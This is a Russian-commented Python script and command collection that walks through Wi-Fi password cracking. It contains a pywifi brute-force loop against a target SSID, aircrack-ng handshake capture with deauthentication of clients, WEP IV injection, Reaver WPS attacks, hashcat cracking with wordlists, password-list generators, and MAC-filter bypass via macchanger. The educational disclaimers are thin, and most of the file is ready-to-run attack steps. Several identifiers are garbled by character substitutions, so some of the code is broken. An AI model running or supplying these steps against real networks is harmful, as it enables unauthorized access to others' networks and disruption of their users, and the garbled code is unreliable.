# ====================================================================================================================================
# Важно отметить, что взлом Wi-Fi-пapoлeй без согласия владельца сети является незаконным действием. Ниже приведены общие методы взлома 
# Wi­Fi-пapoлeй, которые могут использоваться исключительно в образователь­ных целях и только с согласия владельца сети.

# Атака _словаря (Dictionary Attack). В этом методе злоумышленник использует программное обеспечение для перебора паралей, 
# используя большие словари слов и комбинаций символов. На Python можно написать скрипт, который будет перебирать пароли из файла словаря и 
# пытаться подключиться к защищенной сети Wi-Fi с каждым паролем.
# ======================================================================================================================================

# код для атаки словарем
import pywifi
from pywifi import const

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

profile = pywifi.Profile()
profile.ssid = "TargetSSID"

with open("passwords.txt", "r") as f:
    passwords = f.readlines()

for password in passwords:
    profile.key = password.strip()
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    iface.disconnect()


# Использование инструментов для аудита Wi-Fi - это процесс сканирования, анализа и проверки безопасности беспроводных сетей. 
# Эти инструменты помогают обнаруживать уязвимости, определять уровень защиты сети и проверять её конфигурацию.

# airmon-ng - переключает беспроводной адаптер в режим монито­ринга.
# airodump-ng - захватывает пакеты в беспроводных сетях и собирает информацию о точках доступа и клиентах.
# aircrack-ng- взламывает WEP и WPA/WPA2-PSK пароли с использо­ванием собранных пакетов.
# aireplay-ng- генерирует и отправляет пакеты для проведения различ­ных атак (например, атаки деаутентификации).

# Переключение адаптера в режим мониторинга
# airmon-ng start wlan0
# Захват пакетов
# airodump-ng wlanOmon
# Взлом пароля WPA/WPA2
# aircrack-ng -w /path/to/wordlist.txt -b [BSSID] [path/to/capture.cap]

# Запуск Kismet
# kismet

# Запуск Wireshark и выбор интерфейса для захвата пакетов
# wireshark

# Запуск атаки на WPS
# reaver -i wlanOmon -Ь [BSSID] -vv

# Запуск Fern WiFi Cracker
# fern-wifi-cracker

# Scapy - это мощный пакет для создания, отправки и анализа сетевых пакетов. Он поддерживает множество сетевых протоколов и позволяет 
# создавать собственные скрипты для сканирования беспроводных сетей, анализа их параметров и выполнения различных видов атак.

from scapy.all import *

def packet_callback(packet):
    print(packet.show())

# Захват пакетов на интерфейсе wlanO
sniff(iface = "wlan0", prn = packet_callback, count = 10)

# pywifi - это библиотека Python, которая обеспечивает прямой доступ к Wi-Fi-интерфейсам вашего устройства. Она позволяет сканировать
# доступные сети, управлять подключениями, а также выполнять друтие действия, связанные с беспроводными сетями.

import pywifi
from pywifi import const

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()(0)
iface.scan()

# Ожидание завершения сканирования
import time
time.sleep(2)

results = iface.scan_results()
for network in results:
    print(f"SSID: {network.ssid}, Signal: {network.signal}")

# Wireless - это библиотека Python для работы с беспроводными интер­фейсами. Она позволяет выполнять сканирование сетей, 
# получать инфор­мацию о сетевых интерфейсах и проводить друтие операции, связанные с Wi-Fi.

from wireless import Wireless

wireless = Wireless()
networks = wireless.scan()
for network in networks:
    print(f"SSID: {network.ssid}, Quality: {network.quality}")

# Scapy-HTTP- это дополнение к Scapy, которое добавляет функциональ­ность для работы с протоколом НТТР. 
# С его помощью можно анализиро­вать НТТР-запросы и ответы, перехватывать сессии и атаковать уязвимо­сти веб-приложений через Wi-Fi-ceть.

from scapy.all import *
from scapy.layers.http import *

def http_packet_callback(packet):
    if packet.haslayer(HTTPRequest):
        http_layer = packet.getlayer(HTTPRequest)
        print(f"HTTP Request: {http_layer.Host}{http_layer.Path}")

sniff(iface = "wlan0", prn = http_packet_callback, filter = "tcp port 80", count = 10)

# Pyshark - это обертка для WireShark, которая позволяет использовать функционал WireShark из Python. 
# С его помощью можно захватывать и анализировать пакеты данных Wi-Fi-ceтeй, а также выполнять другие операции, поддерживаемые WireShark.

import pyshark

capture =_pyshark.LiveCapture(interface = 'wlan0')
capture.sniff(packet_count = 10)

for packet in capture:
    print(packet)


# Сканирование доступных сетей:
import pywifi

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

iface. scan()
results = iface.scan_results()
for network in results:
    print("SSID:", network.ssid, "Signal Strength:", network.signal)


# Подключение к Wi-Fi-ceти:
import pywifi
import time

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

profile = pywifi.Profile()
profile.ssid = "TargetSSID"
profile.auth = const.AUTH_ALG_OPEN
profile.akm.append(const.АКМ_ТУРЕ_WРА2РSК)
profile.cipher = const.CIPHER_TYPE_CCMP
profile.key = "passwordl23"

tmp_profile = iface.add_network_profile(profile)
iface.connect(tmp_profile)

time.sleep(10) # Подождать, чтобы убедиться, что подключение установлено
print("Connection estaЫished:", iface.status() == const.IFACE_CONNECTED)


# Проверка информации о текущем подключении:
import pywifi

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

print("Connected SSID:", iface.ssid())
print("MAC Address:", iface.mac_address())
print("Signal Strength:", iface.signal())

# Установка nmap: sudo apt-get install nmap

# Скрипт для запуска nmap сканирования
import os
def scan_network(network):
    os.system(f"nmap -sP {network}")

# Пример использования
scan_network("192.168.1.0/24")

# Пример использования библиотеки nmap:
import nmap

# Создание объекта сканера

nm = nmap.PortScanner()
# Сканирование сети

nm.scan('192.168.l.0/24', arguments = '-sP')

# Вывод активных устройств
for host in nm.all_hosts():
    print(f'Host : {host} ({nm[host] .hostname()})')
    print(f'State : {nm[host].state()}')


# Пример использования Scapy для анализа трафика:
from scapy.all import *

# Функция для обработки пакетов
def packet_callback(packet):
    if packet.haslayer(Dotll):
        print(packet.show())

# Захват пакетов на интерфейсе wlanO
sniff(iface = "wlan0", prn = packet_callback, count = 10)

# Установка Pyshark: pip install pyshark

# Пример использования Pyshark для анализа трафика:
import pyshark

# Захват пакетов на интерфейсе wlanO
capture = pyshark.LiveCapture(interface = 'wlan0')
capture.sniff(packet_count = 10)

# Анализ пакетов
for packet in capture:
    print(packet)


# Установка speedtest-cli: pip install speedtest-cli

import speedtest

def test_speed():
    st = speedtest.Speedtest()

    st.get_best_server()

    download_speed = st.download()
    upload_speed = st.upload()

    ping_result = st.results.ping

    print(f"Download speed: {download_speed / 1_000_000: .2f} Mbps")
    print(f"Upload speed: {upload_speed / 1_000_000: .2f} Mbps")
    print(f"Ping: {ping_result} ms")
               
# Пример использования
test_speed()

# ======================================================================================================================
# Предупреждение: эти задания предназначены исключительно для образовательных целей и для использования на собственных 
# сетях или с явного разрешения владельцев сети. Незаконное использование этих методов является нарушением закона и 
# может повлечь за собой серьёзные правовые последствия.
# ======================================================================================================================

# Использование Aircrack-ng для взлома WEP:

# Установка Aircrack-ng sudo apt update && sudo apt install aircrack-ng -y

# Windows (через WSL или отдельный билд) # Если используете WSL (Ubuntu) sudo apt install aircrack-ng

# macOS (Homebrew) brew install aircrack-ng

# Проверка Wi-Fi адаптера sudo airmon-ng

# Выключите интерфейс Wi-Fi: sudo ifconfig wlan0 down

# Активируйте режим мониторинга: sudo airmon-ng start wlan0

# Проверьте режим: iwconfig

# Запустите сканирование: sudo airodump-ng wlan0mon

# Запустите захват пакетов для целевой сети: sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_capture wlan0mon

# Запустите атаку: sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h [MAC_клиента] wlan0mon

# Как только накопится ~50 000 IVs, нажмите Ctrl+C в airodump-ng и запустите: sudo aircrack-ng wep_capture-01.cap

# Если IVs достаточно, появится WEP-ключ: KEY FOUND! [ 12:34:56:78:90 ]

# Возврат адаптера в обычный режим
# sudo airmon-ng stop wlan0mon
# sudo ifconfig wlan0 up

# ========================================================================================================================

# Атака на WPA/WPA2 с использованием словаря:

# Установка словаря (если нет)
# Kali Linux: скачиваем rockyou.txt
# sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Или клонируем SecLists
# git clone https://github.com/danielmiessler/SecLists.git

# Активируем режим мониторинга
# sudo airmon-ng start wlan0
# sudo airodump-ng wlan0mon

# Запускаем захват пакетов
# sudo airodump-ng -c [CH] --bssid [BSSID] -w wpa_handshake wlan0mon

# Пример: sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa_handshake wlan0mon

# Вариант: Принудительное отключение (деаутентификация)
# sudo aireplay-ng -0 3 -a [BSSID] -c [CLIENT_MAC] wlan0mon

# Пример: sudo aireplay-ng -0 3 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Или проверяем файл: sudo aircrack-ng wpa_handshake-01.cap

# Запуск атаки: sudo aircrack-ng -w [wordlist.txt] -b [BSSID] wpa_handshake-01.cap

# Пример: sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 wpa_handshake-01.cap

# Конвертируем .cap в .hccapx: sudo aircrack-ng -J output wpa_handshake-01.cap

# Запускаем hashcat: hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt

# =========================================================================================================================

# Использование Reaver для атаки на WPS:

# Способ: Использование wash (из комплекта Reaver)
# sudo wash -i wlan0mon

# Стандартная атака
# sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv

# Ускорение атаки (если роутер медленный)
# sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -d 3 -L -N -T 1

# ==========================================================================================================================

# Использование Hashcat для атаки на WPA/WPA2:

# Установка Hashcat и драйверов
# На Linux (Kali, Ubuntu, Debian)
# sudo apt update
# sudo apt install hashcat ocl-icd-opencl-dev -y

# Переведите Wi-Fi адаптер в режим мониторинга:
# sudo airmon-ng start wlan0

# Найдите целевую сеть:
# sudo airodump-ng wlan0mon

# Захватите handshake:
# sudo airodump-ng -c [канал] --bssid [BSSID] -w handshake wlan0mon

# Деаутентифицируйте клиента (чтобы вызвать переподключение):
# sudo aireplay-ng -0 3 -a [BSSID] -c [клиент_MAC] wlan0mon

# Проверьте наличие handshake:
# sudo aircrack-ng handshake-01.cap

# Конвертация .cap в формат .hccapx (для Hashcat)
# sudo aircrack-ng handshake-01.cap -J output

# Атака с использованием Hashcat
# hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt

# Атака с правилами (усложнение словаря)
# hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Атака по маске (если известна структура пароля)
# hashcat -m 2500 output.hccapx -a 3 ?1?1?1?1?1?1?1?1

# Показ результатов
# hashcat -m 2500 output.hccapx --show

# Используйте GPU вместо CPU:
# hashcat -m 2500 -d 1 output.hccapx rockyou.txt  # -d 1 - выбор GPU

# Распределённые вычисления (если есть несколько компьютеров):
# hashcat -m 2500 --brain-server
# hashcat -m 2500 --brain-client

# =================================================================================================================================

# Создание собственной словарной атаки:
# Создание собственного словаря для атак на Wi-Fi (Python + Aircrack-ng/Hashcat)
import itertools

# Базовые словарные элементы
names = ["alex", "maria", "dmitry", "anna", "maxim"]
years = ["1980", "1990", "2000", "2020", "2023"]
common_words = ["password", "admin", "wifi", "network", "secure"]
special_chars = ["!", "@", "#", "$", "%"]

# Генерация комбинаций
with open("custom_wordlist.txt", "w") as f:
    # Простые комбинации (имя + год)
    for name, year in itertools.product(names, years):
        f.write(f"{name}{year}\n")
        f.write(f"{name.capitalize()}{year}\n")
    
    # Добавляем спецсимволы (name + year + !)
    for name, year, char in itertools.product(names, years, special_chars):
        f.write(f"{name}{year}{char}\n")
    
    # Популярные слова с числами (password123)
    for word, num in itertools.product(common_words, range(100, 1000)):
        f.write(f"{word}{num}\n")
    
    # Простые шаблоны (qwerty123!)
    for word, char in itertools.product(["qwerty", "asdfgh", "zxcvbn"], special_chars):
        f.write(f"{word}{char}\n")

print("[+] Словарь создан: custom_wordlist.txt")

# Запуск генератора
# python3 wordlist_gen.py


# Использование словаря в Aircrack-ng
# Захват handshake (если ещё нет)
# sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon

# Атака с кастомным словарём
# sudo aircrack-ng handshake-01.cap -w custom_wordlist.txt

# Конвертируем .cap в .hccapx
# sudo aircrack-ng handshake-01.cap -J output

# Запускаем атаку
# hashcat -m 2500 output.hccapx custom_wordlist.txt

# Ускорение с GPU (если есть)
# hashcat -m 2500 -d 1 output.hccapx custom_wordlist.txt

# Пример улучшенного генератора
import itertools

cities = ["moscow", "petersburg", "kazan"]
phones = ["123", "777", "555"]

with open("enhanced_wordlist.txt", "w") as f:
    # Комбинации: город + год + спецсимвол
    for city, year, char in itertools.product(cities, years, special_chars):
        f.write(f"{city}{year}{char}\n")
    
    # Комбинации имени с телефонными кодами
    for name, code in itertools.product(names, phones):
        f.write(f"{name}{code}\n")

# =============================================================================================================================

# Обход фильтрации по МАС-адресам:
# Определение текущего MAC-адреса
# ifconfig wlan0

# Или для нового интерфейса в режиме мониторинга:
# ifconfig wlan0mon

# Установка macchanger (если нет)
# sudo apt install macchanger

# Случайный MAC-адрес
# sudo ifconfig wlan0 down  # Выключаем интерфейс
# sudo macchanger -r wlan0  # Случайный MAC
# sudo ifconfig wlan0 up    # Включаем интерфейс

# Конкретный MAC-адрес (имитация разрешённого)
# sudo ifconfig wlan0 down
# sudo macchanger -m 00:11:22:33:44:55 wlan0
# sudo ifconfig wlan0 up

# Отсканируйте сети:
# sudo iwlist wlan0 scan | grep ESSID

# Попробуйте подключиться:
# sudo nmcli dev wifi connect "Test_Network" password "yourpassword"

# Возврат оригинального MAC-адреса
# sudo ifconfig wlan0 down
# sudo macchanger -p wlan0
# sudo ifconfig wlan0 up

# Скрипт для автоматического подбора разрешённого MAC:
#!/bin/bash

# Выключаем интерфейс
# sudo ifconfig wlan0 down

# Пробуем 10 случайных MAC-адресов
# for i in {1..10}; do
#     echo "Попытка $i/10"
#     sudo macchanger -r wlan0
#     sudo ifconfig wlan0 up
    
#     # Пытаемся подключиться
#     if nmcli dev wifi connect "Test_Network" password "yourpassword"; then
#         echo "Успешное подключение!"
#         exit 0
#     fi
    
#     sudo ifconfig wlan0 down
# done

# echo "Не удалось подключиться"
